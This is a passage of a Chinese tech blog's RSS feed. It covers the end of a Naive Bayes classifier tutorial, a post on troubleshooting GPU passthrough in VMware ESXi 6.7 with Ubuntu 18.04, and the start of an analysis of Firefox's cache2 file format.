&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;trainMat&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;[]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; postinDoc &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; listOPosts:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    trainMat&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;append(setOfWords2Vec(myVocabList, postinDoc))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;第三步训练模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e4%b8%89%e6%ad%a5%e8%ae%ad%e7%bb%83%e6%a8%a1%e5%9e%8b&#34;&gt;
        #
    &lt;/a&gt;
    第三步：训练模型
&lt;/div&gt;
&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p0V,p1V,pAb &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; trainNB0(array(trainMat),array(listClasses))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;最后测试模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%9c%80%e5%90%8e%e6%b5%8b%e8%af%95%e6%a8%a1%e5%9e%8b&#34;&gt;
        #
    &lt;/a&gt;
    最后：测试模型
&lt;/div&gt;
&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;testEntry &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;love&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;my&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;dalmation&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;thisDoc &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; array(setOfWords2Vec(myVocabList, testEntry))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(testEntry,&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;classified as: &amp;#39;&lt;/span&gt;,classifyNB(thisDoc,p0V,p1V,pAb))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;testEntry &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;stupid&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;garbage&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;thisDoc &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; array(setOfWords2Vec(myVocabList, testEntry))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(testEntry,&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;classified as: &amp;#39;&lt;/span&gt;,classifyNB(thisDoc,p0V,p1V,pAb))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;[&#39;love&#39;, &#39;my&#39;, &#39;dalmation&#39;] classified as:  0
[&#39;stupid&#39;, &#39;garbage&#39;] classified as:  1&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>VMware ESXi 6.7.0 update2 使用 GPU Passthrough 模式的坑</title>
      <link>/2019/07/vmware-esxi-6.7.0-update2-%E4%BD%BF%E7%94%A8-gpu-passthrough-%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/</link>
      <pubDate>Mon, 08 Jul 2019 22:38:07 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/07/vmware-esxi-6.7.0-update2-%E4%BD%BF%E7%94%A8-gpu-passthrough-%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%9D%91/</guid>
      <description>&lt;!--toc--&gt;
&lt;p&gt;最近新买的服务器上安装了 ESXi v6.7.0 update 2，想把手上的一块显卡配起来在虚拟机中使用，查了官方资料发现可以使用直通（PassThrough）模式让虚拟机直接使用显卡。配置 ESXi 的过程还是基本顺利的，可是在把显卡分配给 Ubuntu 18.04 虚拟机时却碰到了意想不到的问题。&lt;/p&gt;
&lt;h1 id=&#34;esxi-配置显卡直通passthorugh模式&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#esxi-%e9%85%8d%e7%bd%ae%e6%98%be%e5%8d%a1%e7%9b%b4%e9%80%9apassthorugh%e6%a8%a1%e5%bc%8f&#34;&gt;
        ##
    &lt;/a&gt;
    ESXi 配置显卡直通（PassThorugh）模式
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;这里主要列出配置的关键点不展开说明。配置的方法过程可以参考这篇文档：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blogs.vmware.com/apps/2018/04/how-enable-compute-accelerators-vsphere-6-5-machine-learning-hpc-workloads.html&#34;&gt;https://blogs.vmware.com/apps/2018/04/how-enable-compute-accelerators-vsphere-6-5-machine-learning-hpc-workloads.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果使用 vGPU 的模式进行配置时需要在 ESXi 中安装对应的驱动，如果是NVidia显卡可以从这里下载，不过多数家用级的 GPU 本身不支持这种模式，所以安装之前最好确认一下。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.nvidia.com/drivers/results/116135&#34;&gt;https://www.nvidia.com/drivers/results/116135&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;另外，服务器的 BIOS 需要进行正确设置，主要是查看 VT-D / IOMMU / SR-IOV 相关的设置&lt;/p&gt;
&lt;h1 id=&#34;安装虚拟机&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85%e8%99%9a%e6%8b%9f%e6%9c%ba&#34;&gt;
        ##
    &lt;/a&gt;
    安装虚拟机
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;安装完 Ubuntu 18.04 后问题就接踵而至。&lt;/p&gt;
&lt;h2 id=&#34;第一个坑虚拟机类型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e4%b8%80%e4%b8%aa%e5%9d%91%e8%99%9a%e6%8b%9f%e6%9c%ba%e7%b1%bb%e5%9e%8b&#34;&gt;
        #
    &lt;/a&gt;
    第一个坑：虚拟机类型
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;原本按照默认的 ESXi 6.7 类型创建虚拟机但无论后面怎么设置都无法让驱动跟显卡正常工作，这里一定要选择 ESXi 6.7 U2 类型的机器。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/11/vm-type-u2.png&#34; alt=&#34;VM type U2&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第二个坑内存预留&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e4%ba%8c%e4%b8%aa%e5%9d%91%e5%86%85%e5%ad%98%e9%a2%84%e7%95%99&#34;&gt;
        #
    &lt;/a&gt;
    第二个坑：内存预留
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;创建虚拟机时的默认配置不会将虚拟机的内存选项设置成“预留所有客户机内存 (全部锁定)”，但在使用 GPU PassThrough 的情况下需要把这个选项打开才行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/07/ESXi-GPU-PassThrough/1.jpeg&#34; alt=&#34;memory reserve&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第三个坑添加参数-hypervisorcpuidv0--false&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e4%b8%89%e4%b8%aa%e5%9d%91%e6%b7%bb%e5%8a%a0%e5%8f%82%e6%95%b0-hypervisorcpuidv0--false&#34;&gt;
        #
    &lt;/a&gt;
    第三个坑：添加参数 hypervisor.cpuid.v0 = &amp;ldquo;FALSE&amp;rdquo;
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;一定要添加这个参数，让驱动把虚拟机当做物理机来处理。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2019/11/vm-param-hypervisor.png&#34; alt=&#34;hypervisor-cpuid&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第四个坑ubuntu-1804-虚机升级系统后重启黑屏&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e5%9b%9b%e4%b8%aa%e5%9d%91ubuntu-1804-%e8%99%9a%e6%9c%ba%e5%8d%87%e7%ba%a7%e7%b3%bb%e7%bb%9f%e5%90%8e%e9%87%8d%e5%90%af%e9%bb%91%e5%b1%8f&#34;&gt;
        #
    &lt;/a&gt;
    第四个坑：Ubuntu 18.04 虚机升级系统后重启黑屏
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;这个问题折腾了很久才弄明白是由于升级 Intel CPU 的微代码固件（Meltdown安全漏洞）造成的，为了能够使用虚拟机只能放弃这个固件的升级：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo apt-mark hold intel-microcode
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;该问题的讨论可以参考这个帖子：&lt;a href=&#34;https://askubuntu.com/questions/1155634/intel-microcode-package-upgrade-in-ubuntu-18-04-leads-to-unbootable-system&#34;&gt;https://askubuntu.com/questions/1155634/intel-microcode-package-upgrade-in-ubuntu-18-04-leads-to-unbootable-system&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;第五个坑系统自带-nouveau-驱动造成-nvidia-驱动无法加载&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%ac%ac%e4%ba%94%e4%b8%aa%e5%9d%91%e7%b3%bb%e7%bb%9f%e8%87%aa%e5%b8%a6-nouveau-%e9%a9%b1%e5%8a%a8%e9%80%a0%e6%88%90-nvidia-%e9%a9%b1%e5%8a%a8%e6%97%a0%e6%b3%95%e5%8a%a0%e8%bd%bd&#34;&gt;
        #
    &lt;/a&gt;
    第五个坑：系统自带 nouveau 驱动造成 nvidia 驱动无法加载
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;在虚拟机中安装 NVidia 驱动后重启系统后，正常情况可以看到系统正常加载 nvidia 驱动。&lt;/p&gt;
&lt;p&gt;安装 NVidia 驱动方法：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo apt install gcc g++ make

$ sudo apt-get install nvidia-driver-410 xserver-xorg-video-nvidia-410 libnvidia-compute-410 libnvidia-decode-410 libnvidia-encode-410 libnvidia-ifr1-410 libnvidia-fbc1-410 libnvidia-gl-410 xorg-video-abi-23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但重启虚拟机后会发现有时系统会正常加载 nvidia.ko 驱动，有时会加载 nouveau.ko 驱动，造成无法正常使用显卡。&lt;/p&gt;
&lt;p&gt;驱动加载的确认方法可以用 &amp;rsquo;lsmod | grep nvidia&amp;rsquo; 或 &amp;rsquo;lsmod | grep nouveau&amp;rsquo; 命令。&lt;/p&gt;
&lt;p&gt;可以用下面这个比较暴力的方法禁用 nouveau 驱动：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo mv /lib/modules/4.18.0-25-generic/kernel/drivers/gpu/drm/nouveau/nouveau.ko /lib/modules/4.18.0-25-generic/kernel/drivers/gpu/drm/nouveau/nouveau.ko.disabled
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里多说一些禁用 nouveau 驱动过程中碰到的坑：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;失败经历1：在 grub 及系统加载模块中禁用 nouveau&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用这个方法我发现在 Ubuntu 18.04 虚机启动后有时会正确加载 nvidia 驱动，有时却依然会加载 nouveau，确认的方法可以用 &amp;rsquo;lsmod | grep nvidia&amp;rsquo; 或 &amp;rsquo;lsmod | grep nouveau&amp;rsquo; 命令来确认。&lt;/p&gt;
&lt;p&gt;在此把这个方法记录下来，也可能对别的虚拟机有效。&lt;/p&gt;
&lt;p&gt;第一步：在 grub 中禁止 nouveau&lt;/p&gt;
&lt;p&gt;先把下面的配置添加到 /etc/default/grub 文件中&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GRUB_CMDLINE_LINUX=&amp;#34;nouveau.blacklist=1&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后更新 grub：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo update-grub
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第二步：禁用 modprobe&lt;/p&gt;
&lt;p&gt;创建文件 &amp;lsquo;/etc/modprobe.d/nvidia-graphics-drivers.conf&amp;rsquo;，在其中添加下面内容：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;blacklist nouveau
blacklist lbm-nouveau
alias nouveau off
alias lbm-nouveau off
options nouveau modeset=0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then update initrd:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo update-initramfs -u
$ sudo reboot
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;**失败经历2：在 gdm 中禁用 Wayland **&lt;/p&gt;
&lt;p&gt;参考了这个讨论后尝试后问题依然存在
&lt;a href=&#34;https://askubuntu.com/questions/1031511/cant-disable-nouveau-drivers-in-ubuntu-18-04&#34;&gt;https://askubuntu.com/questions/1031511/cant-disable-nouveau-drivers-in-ubuntu-18-04&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;查看 gdm 是否使用 wayland 模式的方法：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; $ loginctl
 SESSION     UID  USER     SEAT     TTY             
       2    1000  velix    seat0    tty2            
      c2    1000  velix                                             
      c1     120  gdm      seat0    tty1
The command loginctl show-session &amp;lt;session-n&amp;gt; -p Type show the session type:

$ loginctl show-session c1 -p Type
Type=Wayland
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在 gdm 配置文件 /etc/gdm3/custom.conf 中禁用的方法是添加下面一行配置后重启系统：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;WaylandEnable=false.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;趟过去上面几个坑之后就可以正常的在 Ubuntu 18.04 虚拟机中使用显卡直通模式了。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ nvidia-smi
Thu Aug  8 17:31:13 2019
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 410.48                 Driver Version: 410.48                    |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|===============================+======================+======================|
|   0  GeForce GTX 108...  Off  | 00000000:03:00.0 Off |                  N/A |
|  0%   50C    P8    18W / 250W |   1001MiB / 11178MiB |      0%      Default |
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
| Processes:                                                       GPU Memory |
|  GPU       PID   Type   Process name                             Usage      |
|=============================================================================|
|    0      4913      C   /conda/envs/cudf/bin/python                  191MiB |
|    0     10664      C   /home/jupyter/testing-libgdf                 203MiB |
|    0     10871      C   /conda/envs/cudf/bin/python                  191MiB |
|    0     11730      C   /conda/envs/cudf/bin/python                  203MiB |
|    0     11826      C   /conda/envs/cudf/bin/python                  203MiB |
+-----------------------------------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>Firefox cache2 数据结构解析</title>
      <link>/2019/06/firefox-cache2-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</link>
      <pubDate>Sun, 30 Jun 2019 23:10:02 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2019/06/firefox-cache2-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</guid>
      <description>&lt;!--toc--&gt;
&lt;p&gt;开始研究firefox磁盘保存的文件格式源于最近使用selenium做爬虫抓数据时需要下载爬取时的图片碰到的一些问题。&lt;/p&gt;
&lt;p&gt;先简单说一下最开始使用selenium下载图片时摸索出的几个办法：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方法&lt;/th&gt;
&lt;th&gt;优点&lt;/th&gt;
&lt;th&gt;缺点&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;使用requests包直接访问图片资源并保存成文件&lt;/td&gt;
&lt;td&gt;可以直接下载原始图片文件&lt;/td&gt;
&lt;td&gt;增大网络流量及耗时&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;使用webdriver找到图片元素，调用snapshot()保存图片&lt;/td&gt;
&lt;td&gt;操作简单&lt;/td&gt;
&lt;td&gt;chromedriver工作正常，但firefox的geckodriver下载图片位置存在偏差。图片保存格式为png，并且尺寸有偏差。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;用webdriver在新页面中打开图片，再用snapshot()方法进行保存&lt;/td&gt;
&lt;td&gt;可以解决上面firefox保存图片的问题&lt;/td&gt;
&lt;td&gt;图片格式为png，操作费时&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;找到图片在页面上的具体位置，使用snapshot()针对坐标位置进行截图&lt;/td&gt;
&lt;td&gt;可以解决上面firefox保存图片偏差的问题&lt;/td&gt;
&lt;td&gt;保存格式为png，并且难以控制图片尺寸&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;上面几个方法虽然可以靠时间和后续处理解决问题，但是都不是很好的方法。之后想到了浏览器对图片应该使用缓存进行处理，于是就想是否可以通过查看磁盘上保存的浏览器缓存数据找到需要保存的图片资源。经过一番研究后基本搞明白了firefox的
cache2缓存文件的格式，下面对缓存文件格式做个分析。&lt;/p&gt;
&lt;h1 id=&#34;firefox-cache2-文件目录结构&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#firefox-cache2-%e6%96%87%e4%bb%b6%e7%9b%ae%e5%bd%95%e7%bb%93%e6%9e%84&#34;&gt;
        ##
    &lt;/a&gt;
    Firefox cache2 文件目录结构
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;Firefox在用户的profile目录中保存缓存文件结构，可以通过在firefox地址输入框中输入&amp;rsquo;about:profiles&amp;rsquo;查看当前用户的profile目录。&lt;/p&gt;
&lt;p&gt;在profile中找到&amp;rsquo;cache2&amp;rsquo;目录，该目录保存了浏览器的缓存数据。其中主要内容有两个：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;lsquo;index&amp;rsquo;文件：该文件是缓存的索引文件，记录了每一个被缓存在本地磁盘上的缓存文件的基本元信息，比如缓存记录的使用频率、过期时间、文件大小等&amp;hellip;&lt;/li&gt;
&lt;li&gt;&amp;rsquo;entries&amp;rsquo;目录：目录中的每一个文件对应一个被浏览器缓存的数据文件，并且文件使用特定的数据格式存储了相应的元信息，比较重要的信息有URL&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ls
AlternateServices.txt        cache2                       extensions.json              pkcs11.txt                   startupCache
OfflineCache                 cert9.db                     favicons.sqlite              places.sqlite                storage
SecurityPreloadState.txt     compatibility.ini            formhistory.sqlite           pluginreg.dat                storage-sync.sqlite
SiteSecurityServiceState.txt containers.json              gmp                          prefs.js                     storage.sqlite
TRRBlacklist.txt             content-prefs.sqlite         gmp-gmpopenh264              safebrowsing                 thumbnails
addonStartup.json.lz4        cookies.sqlite               gmp-widevinecdm              saved-telemetry-pings        times.json
addons.json                  crashes                      handlers.json                search.json.mozlz4           weave
blocklist.xml                datareporting                key4.db                      sessionCheckpoints.json      webappsstore.sqlite
bookmarkbackups              extension-preferences.json   minidumps                    sessionstore-backups         webappsstore.sqlite-shm
broadcast-listeners.json     extensions                   permissions.sqlite           sessionstore.jsonlz4         xulstore.json


$ ls cache2/
doomed    entries   index     index.log

$ ls cache2/entries/
017239BD353C39FEF561AD4878BC169D5B89D5FA 5D032C390BFDCC43406BE001CADB00C017762B77 B25D0FBB9AD160F3CA160ED3E26BFF9F0E274929
026860131AC8837A36968B435E640BDD30992E73 5D2DC9AE83B62B8763A0C14BDB89C4C45EFA111D B2BB561C0A27E72044D3AEE5425F4E5A8F0348E2
04465FB4C96F61466B9A67422B84ECC5F3EDEBC6 5E4954707B44E5A4B4ACF5F22B52219A1DCA477F B35B9720DB46BE7509AD4A253DDA32F12CEFFBC8
04978A7A83CF7B8511841F4A26598987807DBC89 5F34A74D1380D10E61240C4B94321E6D5B7812DB B412652745622FCEAC058F3F08A728999A3B4664
04D7BC87034DE29F67E22BAA58D84F3D1C64E15A 5FE950976304D0FC774A22F674AF6B00E8528C88 B4160F7B008034AC71D5F250245DFE39FBEEC360
06B62E73358EF1CBB9F8B4068FB133EE20D83FBF 601487B53548B7563ABB522C9452E066D0E8F82B B428F0BFE97CCBEF8F796B282FAF44664A4B0328
07D9B3A9557270C7517C771711663C8F78019C12 6059AD83AC6E3CFF4FEE798D7BD32709ED3F51DE B45040B5F7F65C61AF516477B393B2C3129BEA9A
0843F8C54EDE9BDFABABDB50655BB7CD89945828 609B40F6174E219E48CD0A82ECF3ADE83FFE90B6 B4E19E0CA4676E3E873F580DB210101AB849FBA6
...
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;缓存index文件格式&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bc%93%e5%ad%98index%e6%96%87%e4%bb%b6%e6%a0%bc%e5%bc%8f&#34;&gt;
        ##
    &lt;/a&gt;
    缓存index文件格式
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;文件使用Big-endian字节序，文件由1个文件头及后续多个描述缓存文件的数据块构成，每一块描述一个对应的缓存文件。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;偏移&lt;/th&gt;
&lt;th&gt;Size&lt;/th&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x0&lt;/td&gt;
&lt;td&gt;12 Bytes&lt;/td&gt;
&lt;td&gt;文件头&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xC&lt;/td&gt;
&lt;td&gt;36 Bytes&lt;/td&gt;
&lt;td&gt;第一个缓存文件描述块&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x30&lt;/td&gt;
&lt;td&gt;36 Bytes&lt;/td&gt;
&lt;td&gt;第二个缓存文件描述块&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;hellip;&lt;/td&gt;
&lt;td&gt;&amp;hellip;&lt;/td&gt;
&lt;td&gt;&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xC+N*0x24&lt;/td&gt;
&lt;td&gt;36 Bytes&lt;/td&gt;
&lt;td&gt;第N个缓存文件描述块&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;文件头具体结构如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;偏移&lt;/th&gt;
&lt;th&gt;size&lt;/th&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x0&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;版本号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x4&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;最后一次更新时间戳&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x8&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;脏数据标记&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;每一个缓存描述块内部结构如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;内部偏移&lt;/th&gt;
&lt;th&gt;size&lt;/th&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x0&lt;/td&gt;
&lt;td&gt;20 Bytes&lt;/td&gt;
&lt;td&gt;缓存文件key（&amp;rsquo;:&amp;rsquo;+URL）的sha1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x14&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;使用频率&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x18&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;过期时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1C&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;app ID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x20&lt;/td&gt;
&lt;td&gt;1 Bytes&lt;/td&gt;
&lt;td&gt;缓存文件flag&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x21&lt;/td&gt;
&lt;td&gt;3 Bytes&lt;/td&gt;
&lt;td&gt;缓存文件大小&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;缓存文件格式&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bc%93%e5%ad%98%e6%96%87%e4%bb%b6%e6%a0%bc%e5%bc%8f&#34;&gt;
        ##
    &lt;/a&gt;
    缓存文件格式
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&amp;lsquo;cache2/entries&amp;rsquo;目录中的每个文件用来记录一个被缓存的文件，文件内容也是Big-endian，文件格式如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;偏移&lt;/th&gt;
&lt;th&gt;size&lt;/th&gt;
&lt;th&gt;内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x0&lt;/td&gt;
&lt;td&gt;缓存文件大小&lt;/td&gt;
&lt;td&gt;被缓存文件内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;紧接着缓存数据&lt;/td&gt;
&lt;td&gt;4+n_chunk*2&lt;/td&gt;
&lt;td&gt;暂时还不清楚其中具体内容，不过文件URL信息不在其中&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;紧接着上面的位置&lt;/td&gt;
&lt;td&gt;可变长度&lt;/td&gt;
&lt;td&gt;被缓存文件元信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;文件最后&lt;/td&gt;
&lt;td&gt;4 Bytes&lt;/td&gt;
&lt;td&gt;被缓存文件内容的尺寸&lt;/td&gt;
